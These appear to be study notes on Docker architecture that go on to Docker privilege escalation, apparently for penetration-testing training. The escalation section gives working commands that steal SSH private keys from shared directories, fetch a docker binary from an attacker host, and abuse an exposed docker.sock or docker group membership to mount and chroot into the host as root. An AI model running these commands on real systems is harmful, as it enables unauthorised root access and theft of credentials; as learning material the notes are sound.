## Docker Architecture

**Docker Daemon
Powerhouse behind Docker, like a server
- running Docker containers
- interacting with Docker containers
- managing Docker containers on the host system
- captures container logs
- provices insight into container activities, errors, and debugging information
- monitors resource utilization, such as CPU, memory, and network usage

**Docker Clients
Through RESTful API or Unix socket, we can
- create containers
- start containers
- stop containers
- manage containers
- remove containers
- search images
- download images

**Docker Compose
Simplifies the orchestration of multiple Docker containers as a single application
Allows us to define our application's multi-containers architecture using a declarative YAML (.yaml/.yml)

**Docker Desktop
GUI

## Docker Images and Containers
Docker image is a blueprint or template for creating containers, it is read-only
We can create images using a text file called a Dockerfile
A docker container, which can be modified during runtime, is an instance of a Docker image


## Docker Privilege Escalation

**Docker Shared Directories
```shell-session
cd /hostsystem/home/cry0l1t3
ls -l
cat .ssh/id_rsa
ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```
- copy key to cry0l1t3.priv 

**Docker Sockets
```shell-session
ls -al
```

**Docker binary to interact with the socket and enumerate docker containers already running
```shell-session
wget https://<parrot-os>:443/docker -O docker
chmod +x docker
ls -l
/tmp/docker -H unix:///app/docker.sock ps
```

**Access host system
```shell-session
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
/tmp/docker -H unix:///app/docker.sock ps
/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
cat /hostsystem/root/.ssh/id_rsa
```

**Docker Group
```shell-session
id
docker image ls
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```
- allows to control daemon or permits us to run docker as root
- works if root or docker group, or has privileges to be writable

